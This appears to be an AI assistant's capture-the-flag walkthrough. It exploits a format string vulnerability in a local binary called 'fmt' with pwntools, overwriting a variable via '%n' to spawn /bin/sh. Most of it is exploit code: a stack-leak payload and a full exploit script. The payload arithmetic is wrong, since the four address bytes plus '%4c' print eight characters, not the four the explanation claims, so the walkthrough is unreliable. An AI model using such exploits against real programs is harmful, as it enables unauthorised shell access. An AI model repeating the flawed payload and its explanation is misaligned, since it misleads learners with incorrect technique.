To solve this challenge using Pwntools, we'll exploit the format string vulnerability present in the program to overwrite the value of the variable `x` with `4`. This will trigger the condition `if ( x == 4 )` and give us a shell by executing `system("/bin/sh")`.

Here's a step-by-step guide with code examples:

---

### **1. Analyze the Vulnerability**

From the given code, we can see the function `main` reads input into `buf` and then passes it directly to `printf` without a format string:

```c
read(0, buf, 0x50u);
printf(buf);
```

This is a classic **format string vulnerability**, where user input is used as the format string, allowing us to perform arbitrary reads and writes in memory.

### **2. Find the Address of the Variable `x`**

We need to overwrite the variable `x` to `4`. To do that, we first need its address. We'll use Pwntools' `ELF` module to parse the binary and extract the symbol address.

```python
from pwn import *

# Load the binary
elf = ELF('./fmt')

# Get the address of 'x'
x_addr = elf.symbols['x']
log.info("Address of x: %#x" % x_addr)
```

### **3. Determine the Correct Offset**

In format string exploits, we need to figure out how many positions on the stack we need to skip to reach our injected address. We'll craft a payload that helps us find this offset.

**Crafting a Payload to Leak Stack Values:**

```python
# Start the process
p = process('./fmt')

# Create a payload to leak stack values
payload = b''
for i in range(1, 15):
    payload += f"%{i}$p ".encode()

# Send the payload
p.sendline(payload)
output = p.recv()

print("Received output:", output.decode())
```

**Analyzing the Output:**

The output will show us the stack values. We need to look for patterns or known values (like `41414141` for `AAAA`) to determine where our input appears on the stack.

### **4. Craft the Exploit Payload**

Once we've determined the correct offset, we'll craft a payload that writes the value `4` into `x_addr` using the `%n` format specifier.

**Building the Payload:**

Assuming we've determined that the offset is `7`, here's how we can build the payload:

```python
offset = 7  # Replace with the correct offset found from step 3

# Build the payload
payload = p32(x_addr)  # Address of 'x' (will be on the stack)
payload += b"%4c"      # Pad the output to 4 characters
payload += f"%{offset}$n".encode()  # Write the number of characters printed into 'x_addr'
```

**Explanation:**

- `p32(x_addr)`: Packs the address of `x` into 4 bytes (little-endian) and places it on the stack.
- `%4c`: Prints 4 spaces, bringing the total number of characters printed to 4.
- `%7$n`: Uses the `%n` specifier to write the number of characters printed so far (which is 4) into the address pointed to by the 7th argument on the stack (which should be `x_addr`).

**Note:** The exact offset may vary. You need to adjust the `offset` value based on the output from step 3.

### **5. Exploit the Vulnerability**

**Full Exploit Script:**

```python
from pwn import *

# Load the binary
elf = ELF('./fmt')

# Get the address of 'x'
x_addr = elf.symbols['x']
log.info("Address of x: %#x" % x_addr)

# Determine the correct offset (this value should be found from step 3)
offset = 7  # Replace with the correct offset

# Build the payload
payload = p32(x_addr)  # Address of 'x' on the stack
payload += b"%4c"      # Pad output to 4 characters
payload += f"%{offset}$n".encode()  # Write to the address

# Ensure payload is within the buffer limit
if len(payload) > 80:
    log.error("Payload is too long!")
    exit()

# Start the process
p = process('./fmt')

# Send the payload
p.sendline(payload)

# Receive any output
output = p.recv()

# Check if we got the shell
if b"running sh..." in output:
    log.success("Exploit successful! Got a shell.")
    # Drop to interactive shell
    p.interactive()
else:
    log.error("Exploit failed.")
    print("Program output:", output.decode())
```

### **6. Run the Exploit**

Execute the script and interact with the shell:

```sh
$ python exploit.py
```

---

**Important Notes:**

- **Adjusting the Offset:** If the exploit doesn't work, you may need to adjust the `offset` value. Try incrementing or decrementing it until you find the correct one.
- **Buffer Size Limitation:** Ensure your payload does not exceed the buffer size (`80` bytes in this case).
- **Error Handling:** Be prepared for crashes or unexpected behavior if the offsets are incorrect. This is normal when developing exploits.

### **Understanding the Exploit**

- **Format String Basics:** The `%n` specifier tells `printf` to write the number of characters printed so far into the address provided.
- **Stack Arguments:** In `printf`, format specifiers pull arguments from the stack. By controlling the position and value of arguments, we can manipulate memory.
- **Exploiting `printf(buf)`:** Since `buf` contains both our format string and our arguments (like addresses), we can craft an input that places the address of `x` on the stack where `printf` expects its arguments.

By following these steps and using the provided code, you should be able to exploit the format string vulnerability in the `fmt` challenge and gain a shell. Remember to carefully analyze the program's behavior and adjust your exploit as needed.
